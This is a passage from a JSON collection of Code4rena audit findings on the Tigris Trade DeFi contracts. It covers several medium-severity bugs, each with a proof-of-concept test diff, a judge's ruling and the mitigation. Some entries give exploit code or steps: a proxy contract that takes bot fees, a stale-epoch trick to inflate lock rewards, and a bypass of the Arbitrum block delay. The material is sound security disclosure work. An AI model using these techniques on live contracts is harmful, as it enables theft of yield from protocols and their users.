      "title": "[M-21] `executeLimitOrder()` modifies open-interest with a wrong position value",
      "impact": "MEDIUM",
      "content": "\nThe `PairsContract` registers the total long/short position that's open for a pair of assets, whenever a new position is created, the total grows accordingly.\n\nHowever at `executeLimitOrder()` the position size that's added is wrongly calculated - it uses margin before fees, while the actual position is created after subtracting fees.\n\n### Impact\n\nThe OpenInterest would register wrong values (11% diff in the case of PoC), which will distort the balance between long and short positions (the whole point of the OpenInterest is to balance them to be about equal).\n\n### Proof of Concept\n\nIn the following test, an order is created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created.\n\n```diff\ndiff --git a/test/07.Trading.js b/test/07.Trading.js\nindex ebe9948..dfb7f98 100644\n--- a/test/07.Trading.js\n+++ b/test/07.Trading.js\n@@ -778,7 +778,7 @@ describe(\"Trading\", function () {\n      */\n     it(\"Creating and executing limit buy order, should have correct price and bot fees\", async function () {\n       // Create limit order\n-      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n+      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"100\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n       await trading.connect(owner).initiateLimitOrder(TradeInfo, 1, parseEther(\"20000\"), PermitData, owner.address);\n       expect(await position.limitOrdersLength(0)).to.equal(1); // Limit order opened\n@@ -787,6 +787,9 @@ describe(\"Trading\", function () {\n       await network.provider.send(\"evm_increaseTime\", [10]);\n       await network.provider.send(\"evm_mine\");\n \n+      let count = await position.getCount();\n+      let id = count.toNumber() - 1;\n+\n       // Execute limit order\n       let PriceData = [node.address, 0, parseEther(\"10000\"), 10000000, 2000000000, false]; // 0.1% spread\n       let message = ethers.utils.keccak256(\n@@ -798,8 +801,22 @@ describe(\"Trading\", function () {\n       let sig = await node.signMessage(\n         Buffer.from(message.substring(2), 'hex')\n       );\n+      // trading.connect(owner).setFees(true,3e8,1e8,1e8,1e8,1e8);\n       \n-      await trading.connect(user).executeLimitOrder(1, PriceData, sig);\n+\n+      let oi = await pairscontract.idToOi(0, stabletoken.address);\n+      expect(oi.longOi.toNumber()).to.equal(0);\n+      console.log({oi, stable:stabletoken.address});\n+\n+      await trading.connect(user).executeLimitOrder(id, PriceData, sig);\n+      let trade = await position.trades(id);\n+      console.log(trade);\n+      oi = await pairscontract.idToOi(0, stabletoken.address);\n+      console.log(oi);\n+\n+      expect(oi.longOi.div(10n**18n).toNumber()).to.equal(trade.margin.mul(trade.leverage).div(10n**18n * 10n**18n).toNumber());\n+\n+\n       expect(await position.limitOrdersLength(0)).to.equal(0); // Limit order executed\n       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Creates open position\n       expect((await trading.openFees()).botFees).to.equal(2000000);\n@@ -807,6 +824,7 @@ describe(\"Trading\", function () {\n       let [,,,,price,,,,,,,] = await position.trades(1);\n       expect(price).to.equal(parseEther(\"20020\")); // Should have guaranteed execution price with spread\n     });\n+    return;\n     it(\"Creating and executing limit sell order, should have correct price and bot fees\", async function () {\n       // Create limit order\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, false, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n@@ -1606,6 +1624,7 @@ describe(\"Trading\", function () {\n       expect(await stabletoken.balanceOf(user.address)).to.equal(parseEther(\"1.5\"));\n     });\n   });\n+  return;\n   describe(\"Modifying functions\", function () {\n     it(\"Updating TP/SL on a limit order should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n\n```\n\nOutput:\n\n    1) Trading\n           Limit orders and liquidations\n             Creating and executing limit buy order, should have correct price and bot fees:\n\n          AssertionError: expected 100000 to equal 90000\n          + expected - actual\n\n          -100000\n          +90000\n\n### Recommended Mitigation Steps\n\nCorrect the calculation to use margin after fees.\n\n**[TriHaz (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/576#issuecomment-1374425022):**\n > I think I confirmed a similar issue.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/576#issuecomment-1385580324):**\n > The Warden has highlighted an discrepancy in how OpenInterest is calculated, the math should cause issues in determining funding rates, however the submission doesn't show a way to reliably extract value from the system.\n> \n> Because of this, I believe the finding to be of Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/576#issuecomment-1407809212):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176899 \n\n\n\n***\n\n",
      "summary": "\nThe `PairsContract` has a bug where the position size calculation is incorrect, resulting in wrong values being registered for OpenInterest. This can cause a distortion in the balance between long and short positions. A test showed that the position size registered for OpenInterest was 11% greater than the actual position created. The recommended mitigation step is to correct the calculation to use margin after fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/576",
      "tags": [],
      "finders": [
        "KingNFT",
        "0xA5DF",
        "HollaDieWaldfee",
        "Jeiwan"
      ]
    },
    {
      "id": "43163",
      "title": "[M-19] `_handleDeposit` and `_handleWithdraw` do not account for tokens with decimals higher than 18",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L650> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675>\n\n### Impact\n\nIn `Trading.sol` a [deposit](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L675) or [withdrawal](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L700) of tokens with decimals higher than 18 will always revert.\n\nThis is the case e.g. for `NEAR` which is divisible into 10e24 `yocto`\n\n### Proof of Concept\n\nChange [00.Mocks.js#L33](https://github.com/code-423n4/2022-12-tigris/blob/main/deploy/test/00.Mocks.js#L33) to:\n\n    args: [\"USDC\", \"USDC\", 24, deployer, ethers.utils.parseUnits(\"1000\", 24)]\n\nThen in [07.Trading.js](https://github.com/code-423n4/2022-12-tigris/blob/main/test/07.Trading.js):\n\n    Opening and closing a position with tigUSD output\n    Opening and closing a position with <18 decimal token output\n\nare going to fail with:\n\n    Error: VM Exception while processing transaction: reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nUpdate calculations in the contract to account for tokens with decimals higher than 18.\n\n**[TriHaz (Tigris Trade) acknowledged and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/533#issuecomment-1375985587):**\n > We are aware of that. We are not planning on adding any token that has more than 18 dec.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/533#issuecomment-1382251600):**\n > The Warden has shown how, due to an underflow, the system in-scope can revert when using tokens with more than 18 decimals.\n> \n> Because of how scope was defined, I believe the finding to be valid, I believe a nofix is acceptable as long as the sponsor keeps in mind this risk.\n> \n> Because of the risk shown, I agree with Medium Severity.\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in a code repository called \"2022-12-tigris\". The problem is in a specific file called \"Trading.sol\" and occurs when trying to deposit or withdraw tokens with more than 18 decimal places. This causes the system to revert, which means the transaction fails. The report includes steps to reproduce the issue and mentions that it was tested using a tool called VS Code. The recommended solution is to update the calculations in the contract to account for tokens with more than 18 decimals. The team behind the code has acknowledged the issue and commented that they are not planning on adding any tokens with more than 18 decimals. The judge has also commented and agrees that the issue is valid and suggests a \"nofix\" solution, meaning they will not fix it but will keep it in mind as a potential risk. This bug is considered a medium severity issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/533",
      "tags": [],
      "finders": [
        "Avci",
        "Deivitto",
        "pwnforce",
        "rbserver",
        "0xDecorativePineapple",
        "Dinesh11G",
        "izhelyazkov",
        "Englave",
        "Tointer",
        "Critical",
        "0xdeadbeef0x",
        "ak1",
        "chaduke",
        "unforgiven",
        "rvierdiiev",
        "yjrwkk",
        "0x4non"
      ]
    },
    {
      "id": "43162",
      "title": "[M-18] StopLoss/TakeProfit should be validated again for the new price in `Trading.executeLimitOrder()`",
      "impact": "MEDIUM",
      "content": "\nThe open price of a stop order might be changed during execution but it doesn't validate StopLoss/TakeProfit for the changed price.\n\nAs a result, the executed market order might be closed immediately and there would be an unexpected loss for users.\n\n### Proof of Concept\n\nAs we can see from `executeLimitOrder()`, the open price might be changed to the current price for the stop order.\n\n```solidity\nFile: 2022-12-tigris\\contracts\\Trading.sol\n480:     function executeLimitOrder(\n481:         uint _id, \n482:         PriceData calldata _priceData,\n483:         bytes calldata _signature\n484:     ) \n485:         external\n486:     {\n487:         unchecked {\n488:             _checkDelay(_id, true);\n489:             tradingExtension._checkGas();\n490:             if (tradingExtension.paused()) revert TradingPaused();\n491:             require(block.timestamp >= limitDelay[_id]);\n492:             IPosition.Trade memory trade = position.trades(_id);\n493:             uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true);\n494:             (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0);\n495:             if (trade.orderType == 0) revert(\"5\");\n496:             if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n497:             if (trade.direction && trade.orderType == 1) {\n498:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet\n499:             } else if (!trade.direction && trade.orderType == 1) {\n500:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n501:             } else if (!trade.direction && trade.orderType == 2) {\n502:                 if (trade.price < _price) revert(\"6\"); //LimitNotMet\n503:                 trade.price = _price;\n504:             } else {\n505:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n506:                 trade.price = _price; //@audit check sl/tp\n507:             } \n508:             if(trade.direction) {\n509:                 trade.price += trade.price * _spread / DIVISION_CONSTANT;\n510:             } else {\n511:                 trade.price -= trade.price * _spread / DIVISION_CONSTANT;\n512:             }\n\n```\nBut it doesn't validate sl/tp again for the new price so the order might have an invalid sl/tp.\n\nThe new price wouldn't satisfy the sl/tp requirements when the price was changed much from the original price due to the high slippage and the order might be closed immediately by sl or tp in this case.\n\nOriginally, the protocol validates stoploss only but I say to validate both of stoploss and takeprofit. (I submitted it as another issue to validate tp as well as sl).\n\n### Recommended Mitigation Steps\n\nRecommend validating sl/tp for the new `trade.price` in `Trading.executeLimitOrder()`.\n\n**[TriHaz (Tigris Trade) disputed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1377414952):**\n > >The open price of a stop order might be changed during execution\n> \n> Limit orders open price is guaranteed, so it will not be changed, so validating sl/tp again is not needed.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1383191670):**\n > @TriHaz can you please check the following line\n> \n> ```solidity\n> 504:             } else {\n> 505:                 if (trade.price > _price) revert(\"6\"); //LimitNotMet\n> 506:                 trade.price = _price; //@audit check sl/tp\n> 507:             } \n> ```\n> \n> and re-affirm your dispute?\n> \n> Ultimately it looks like trade.price is changed to the new price from the feed, which is a \"correct\" price, but may not be a price the caller was originally willing to act on (not in range with SL / TP).\n\n**[TriHaz (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1384625791):**\n > Yes my review was not correct, the price for the stop orders are not guaranteed which makes this issue valid.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1385566692):**\n > The warden has shown how, due to a lack of check, limit orders that pass the logic check may be executed even though the validation for their Stop Loss / Take Profit may not be hit\n> \n> Given the level of detail I believe the finding to be of Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/512#issuecomment-1407849401):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177423 \n >\n> Since this issue only affects TP and not SL, I only added a check for that.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the open price of a stop order being changed during execution without proper validation of Stop Loss (SL) and Take Profit (TP) for the new price. This can result in unexpected losses for users as the executed market order may be closed immediately. The report includes a proof of concept and recommended mitigation steps, which involve validating SL and TP for the new price in the `executeLimitOrder()` function. The issue was initially disputed, but it was later confirmed to be valid by the team. The severity of the issue was determined to be medium and a mitigation was implemented to address it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/512",
      "tags": [],
      "finders": [
        "bin2chen",
        "hansfriese"
      ]
    },
    {
      "id": "43161",
      "title": "[M-17] User can close an order via `limitClose()`, and take bot fees to themselves",
      "impact": "MEDIUM",
      "content": "\nBot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the DAO fee and sent to the closing bot.\nA user can use that  to reduce the DAO fees for closing an order and keeping it to themselves.\n\nInstead of closing the order via `initiateClose()`, the user can use a proxy contract to update the stop-loss value and then `limitClose()` the order.\nSince that is done in one function call, no bot can run the `limitClose()` and the bot fee will go to the user.\n\n### Proof of Concept\n\nThe following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via `limitClose()`:\n\n```diff\ndiff --git a/test/07.Trading.js b/test/07.Trading.js\nindex ebe9948..e50b0cc 100644\n--- a/test/07.Trading.js\n+++ b/test/07.Trading.js\n@@ -17,6 +17,7 @@ describe(\"Trading\", function () {\n \n   let TradingExtension;\n   let tradingExtension;\n+  let myTrader;\n \n   let TradingLibrary;\n   let tradinglibrary;\n@@ -37,7 +38,7 @@ describe(\"Trading\", function () {\n \n   let MockDAI;\n   let MockUSDC;\n-  let mockusdc;\n+  let mockusdc, mockdai;\n \n   let badstablevault;\n \n@@ -55,6 +56,7 @@ describe(\"Trading\", function () {\n     const Position = await deployments.get(\"Position\");\n     position = await ethers.getContractAt(\"Position\", Position.address);\n     MockDAI = await deployments.get(\"MockDAI\");\n+    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n     MockUSDC = await deployments.get(\"MockUSDC\");\n     mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n     const PairsContract = await deployments.get(\"PairsContract\");\n@@ -84,6 +86,10 @@ describe(\"Trading\", function () {\n     TradingLibrary = await deployments.get(\"TradingLibrary\");\n     tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n     await trading.connect(owner).setLimitOrderPriceRange(1e10);\n+\n+\n+    let mtFactory = await ethers.getContractFactory(\"MyTrader\");\n+    myTrader = await mtFactory.deploy(Trading.address, Position.address);\n   });\n   describe(\"Check onlyOwner and onlyProtocol\", function () {\n     it(\"Set max win percent\", async function () {\n@@ -536,6 +542,31 @@ describe(\"Trading\", function () {\n       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened\n       expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther(\"0\")); // Should no tigAsset left\n     });\n+\n+    it(\"Test my trader\", async function () {\n+      let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n+      let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n+      let message = ethers.utils.keccak256(\n+        ethers.utils.defaultAbiCoder.encode(\n+          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n+          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]\n+        )\n+      );\n+      let sig = await node.signMessage(\n+        Buffer.from(message.substring(2), 'hex')\n+      );\n+      \n+      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n+      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n+\n+\n+      await trading.connect(owner).approveProxy(myTrader.address, 1e10);\n+      await myTrader.connect(owner).closeTrade(1, PriceData, sig);\n+\n+\n+    });\n+  return;\n+\n     it(\"Closing over 100% should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n@@ -551,8 +582,10 @@ describe(\"Trading\", function () {\n       \n       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n+\n       await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith(\"BadClosePercent\");\n     });\n+    return;\n     it(\"Closing 0% should revert\", async function () {\n       let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n       let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false];\n@@ -700,6 +733,7 @@ describe(\"Trading\", function () {\n       expect(margin).to.equal(parseEther(\"500\"));\n     });\n   });\n+  return;\n   describe(\"Trading using <18 decimal token\", async function () {\n     it(\"Opening and closing a position with tigUSD output\", async function () {\n       await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time\n\n```\n\n`MyTrader.sol`:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {ITrading} from \"../interfaces/ITrading.sol\";\nimport \"../utils/TradingLibrary.sol\";\nimport \"../interfaces/IPosition.sol\";\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";\n\n\n\n\ncontract MyTrader{\n\n    ITrading trading;\n    IPosition position;\n\n    receive() payable external{\n\n    }\n\n    constructor(address _trading, address _position){\n        trading = ITrading(_trading);\n        position = IPosition(_position);\n    }\n\n    function closeTrade(\n        uint _id,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) public{\n        bool _tp = false;\n        \n        trading.updateTpSl(_tp, _id, _priceData.price, _priceData, _signature, msg.sender);\n        trading.limitClose(_id, _tp, _priceData, _signature);\n\n        \n    }\n\n}\n```\n\n### Recommended Mitigation Steps\n\nDon't allow updating sl or tp and executing `limitClose()` at the same block.\n\n**[TriHaz (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1372980585):**\n > Valid and will be confirmed, but not sure about the severity, as the protocol will not lose anything because fees would be paid to another bot anyway. Would like an opinion from a judge.\n\n**[Alex the Entreprenerd (judge) decreased severity to QA and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1385289111):**\n > With the information that I have:\n> - System invariants are not broken\n> - No loss of value\n> \n> Ordinary operation, which for convenience can be performed by a bot, is being operated by someone else.\n> \n> Because all security invariants are still holding, but the behaviour may be a gotcha, I believe QA Low to be the most appropriate severity in lack of a value leak.\n> \n>\n>*(Note: See [original submission](https://github.com/code-423n4/2022-12-tigris-findings/issues/468) for judge's full commentary.)*\n\n**[Alex the Entreprenerd (judge) increased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1406733309):**\n> Per the discussion above, the Warden has shown how, any user can setup a contract to avoid paying botFees, because these are subtracted to DaoFees, these are not just a loss of yield to the DAO, but they are a discount to users, which in my opinion breaks the logic for fees.\n> \n> Because the finding pertains to a loss of Yield, I raised the report back to Medium Severity.\n> \n> I'd like to thank @0xA5DF for the clarifications done in post-judging triage.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1407792466):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176433 \n> >'Don't allow updating sl or tp and executing limitClose() at the same block'\n> \n> The recommended mitigation wouldn't work, because this would result in a separate high-severity risk. We decided on tracking the timestamp of the last limit order update, and if the order gets executed before a second has passed then the bot doesn't earn bot fees. This gives every bot a fair chance at being rewarded without incentivizing the trader to execute their own order.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the Tigris Trade platform where users can use a proxy contract to update the stop-loss value and then close the order through a function call, allowing them to keep the bot fee for themselves instead of it being subtracted from the DAO fee. This can be exploited to reduce the DAO fees for closing an order. The report provides a proof of concept and recommends a mitigation step of not allowing updating the stop-loss value and executing the limitClose() function in the same block. However, this mitigation may result in a separate high-severity risk, so the team has decided to track the timestamp of the last limit order update and not award bot fees if the order is executed within one second.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/468",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "43160",
      "title": "[M-16] `distribute()` won't update `epoch[tigAsset]` when `totalShares[tigAsset]==0` which can cause later created bond for this tigAsset to have wrong mint epoch",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86>\n\n### Impact\n\nFunction `BondNFT.createLock()` creates a bond and it sets bond's mint epoch as `epoch[asset]`. Function `Lock.lock()` first calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. So during normal bond creation, the value of `epoch[asset]` would be updated and bond would be created from `today` epoch to `today+period` epoch. But if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch(will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`). This would make `createLock()` set very wrong values for bond's mint epoch when `totalShares[tigAsset] == 0`.\n\nThis would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. or `setAllowedAsset(asset, false)`  has been called for that asset.\n\n### Proof of Concept\n\nThis is `distribute()` code in BondNFT contract:\n\n    function distribute(\n            address _tigAsset,\n            uint _amount\n        ) external {\n            if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n            IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n            unchecked {\n                uint aEpoch = block.timestamp / DAY;\n                if (aEpoch > epoch[_tigAsset]) {\n                    for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                        epoch[_tigAsset] += 1;\n                        accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                    }\n                }\n                accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n            }\n            emit Distribution(_tigAsset, _amount);\n        }\n\nAs you can see when `totalShares[_tigAsset] == 0`, then the value of `epoch[_tigAsset]` won't get updated to today. And there is no other logic in the code to update `epoch[tigAsset]`. So when `totalShares[_tigAsset] == 0`, then the value of the `epoch[tigAsset]` would be outdated. this would happen when an asset is recently added to the BondNFT assets or when there is no bond left.\n\nWhen this condition happens and a user calls `Lock.lock()` to create a bond, the `lock()` function would call `claimGovFees()` to update rewards in BondNFT but because for that asset the value of totalShares are 0, that asset `epoch[]` won't get updated and in the `BondNFT.createLock()`, the wrong value would set as bond's mint epoch.\n\nThis is `Lock.lock()` code:\n\n        function lock(\n            address _asset,\n            uint _amount,\n            uint _period\n        ) public {\n            require(_period <= maxPeriod, \"MAX PERIOD\");\n            require(_period >= minPeriod, \"MIN PERIOD\");\n            require(allowedAssets[_asset], \"!asset\");\n\n            claimGovFees();\n\n            IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n            totalLocked[_asset] += _amount;\n            \n            bondNFT.createLock( _asset, _amount, _period, msg.sender);\n        }\n\nAnd this is `BondNFT.createLock()` code:\n\n        function createLock(\n            address _asset,\n            uint _amount,\n            uint _period,\n            address _owner\n        ) external onlyManager() returns(uint id) {\n            require(allowedAsset[_asset], \"!Asset\");\n            unchecked {\n                uint shares = _amount * _period / 365;\n                uint expireEpoch = epoch[_asset] + _period;\n                id = ++totalBonds;\n                totalShares[_asset] += shares;\n                Bond memory _bond = Bond(\n                    id,             // id\n                    address(0),     // owner\n                    _asset,         // tigAsset token\n                    _amount,        // tigAsset amount\n                    epoch[_asset],  // mint epoch\n                    block.timestamp,// mint timestamp\n                    expireEpoch,    // expire epoch\n                    0,              // pending\n                    shares,         // linearly scaling share of rewards\n                    _period,        // lock period\n                    false           // is expired boolean\n                );\n                _idToBond[id] = _bond;\n                _mint(_owner, _bond);\n            }\n            emit Lock(_asset, _amount, _period, _owner, id);\n        }\n\nIf a bond gets wrong value for mint epoch, it would have wrong value for expired epoch and user would get a lot of shares by lock for small time. \n\nFor example this scenario:\n\n1.  Let's assume `epoch[asset1]` is outdated and it shows 30 days ago epoch. (`allowedAsset[asset1]` was false so locking was not possible and then is set as true after 30 days)\n2.  During this time, because `totalShare[asset1]` was 0, the `distribute()` function won't update `epoch[asset1]` and `epoch[asset1]` would show 30 days ago.\n3.  Attacker would create a lock for 32 days by calling `Lock.lock(asset1)`. Code would call `BondNFT.createLock()` and would create a bond for attacker which epoch start time is 30 days ago and epoch expire time is 2 days later and attacker receives shares for 32 days.\n4.  Some reward would get distributed into the BondNFT for the `asset1`.\n5.  Other users would create lock too.\n6.  Attacker would claim his rewards and his rewards would be for 32 day locking but attacker lock his tokens for 2 days in reality.\n\nSo attacker was able to create lock for a long time and get shares and rewards based on that, but attacker can release lock after short time.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nUpdate `epoch[asset]` in `distribute()` function  even when `totalShares[_tigAsset]` is equal to 0. Only the division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated.\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/436)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/436#issuecomment-1387141618):**\n > The Warden has shown a set of circumstances that would allow a locker to lock their tokens for a relatively short period of time, while gaining extra rewards for up to one Epoch.\n> \n> Because the finding is limited to a theft of yield, I believe it to be of Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/436#issuecomment-1407773295):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176233 \n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a function in the BondNFT contract that creates a bond and sets the bond's mint epoch (the time when the bond can be redeemed) as the current epoch for the chosen asset. However, there is a problem when the total shares for the asset are equal to zero. In this case, the epoch for the asset will not be updated, resulting in a wrong value for the bond's mint epoch. This can lead to an attacker creating a bond for a longer period of time and receiving more rewards, but being able to release the bond after a shorter period of time. The suggested mitigation is to update the epoch index even when the total shares are zero. The severity of this bug is considered to be medium. The bug has been resolved by implementing the suggested mitigation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/436",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "43159",
      "title": "[M-15] `_checkDelay` will not work properly for Arbitrum or Optimism due to `block.number`",
      "impact": "MEDIUM",
      "content": "\nTrade delay will not work correctly on Arbitrum allowing users to exploit multiple valid prices.\n\n### Proof of Concept\n\n    function _checkDelay(uint _id, bool _type) internal {\n        unchecked {\n            Delay memory _delay = blockDelayPassed[_id];\n            //in those situations\n            if (_delay.actionType == _type) {\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n            } else {\n                if (block.number < _delay.delay) revert(\"0\"); //Wait\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n                blockDelayPassed[_id].actionType = _type;\n            }\n        }\n    }\n\n`\\_checkDelay` enforces a delay of a specific number of block between opening and closing a position. While this structure will work on mainnet, it is problematic for use on Arbitrum. \n\nAccording to Arbitrum [Docs](https://developer.offchainlabs.com/time) `block.number` returns the most recently synced L1 block number. Once per minute the block number in the Sequencer is synced to the actual L1 block number. This period could be abused to completely bypass this protection. \n\nThe user would open their position 1 Arbitrum block before the sync happens, then close it the very next block. It would appear that there has been 5 blocks (60 / 12) since the last transaction but in reality it has only been 1 Arbitrum block. Given that Arbitrum has 2 seconds blocks it would be impossible to block this behavior through parameter changes.\n\nIt also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is 